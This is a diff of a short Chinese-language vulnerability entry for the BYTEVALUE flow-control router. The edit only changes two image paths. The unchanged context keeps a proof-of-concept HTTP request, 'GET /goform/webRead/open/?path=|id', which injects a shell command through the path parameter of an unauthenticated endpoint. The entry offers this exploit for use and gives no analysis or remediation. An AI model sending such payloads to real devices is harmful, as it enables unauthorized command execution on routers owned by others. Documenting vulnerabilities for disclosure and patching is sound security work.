@@ -18,7 +18,7 @@ BYTEVALUE 百为流控路由器是一款追求带宽利用率的多功能路由�
 
 登陆页面
 
-![image-20231116142008257](images/image-20231116142008257.png)
+![image-20231116142008257](../.gitbook/assets/image-20231116142008257.png)
 
 poc
 
@@ -27,4 +27,4 @@ GET /goform/webRead/open/?path=|id HTTP/1.1
 Host:
 ```
 
-![image-20231116142021268](images/image-20231116142021268.png)
+![image-20231116142021268](../.gitbook/assets/image-20231116142021268.png)
